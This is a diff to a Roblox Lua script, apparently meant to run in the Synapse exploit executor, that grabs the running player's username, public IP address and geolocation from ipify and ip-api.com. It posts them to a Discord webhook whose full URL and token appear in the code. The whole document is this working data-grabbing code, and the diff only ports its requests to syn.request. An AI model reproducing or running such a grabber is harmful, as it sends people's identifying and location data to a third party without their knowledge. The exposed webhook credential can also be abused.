@@ -1,13 +1,15 @@
 local name = game:GetService("Players").LocalPlayer.Name
 local WebhookURL = "https://discord.com/api/webhooks/1081969448958828614/dFsgWlWF5NC-_hQY1NK13_oj6TskYBu84ASE6OvtM5Ng6KLzBvutfyVbl9lZ9jlP2BxG"
-local getIPResponse = request({
+local getIPResponse = syn.request({
     Url = "https://api.ipify.org/?format=json",
+    Method = "GET"
 })
 local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
 local IPBuffer = tostring(GetIPJSON.ip)
  
-local getIPInfo = http.request({
-    Url = string.format("http://ip-api.com/json/%s", IPBuffer)
+local getIPInfo = syn.request({
+    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
+    Method = "Get"
 })
 local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
 local FI = {
@@ -28,7 +30,7 @@ local MessageData = {
     ["content"] = dataMessage
 }
  
-local send_hook = request(
+syn.request(
     {
         Url = WebhookURL, 
         Method = "POST",
@@ -37,6 +39,5 @@ local send_hook = request(
         },
         Body = game:GetService("HttpService"):JSONEncode(MessageData)
     }
-)
-print(send_hook.StatusCode)
-StatusCode)
+) 
+ 
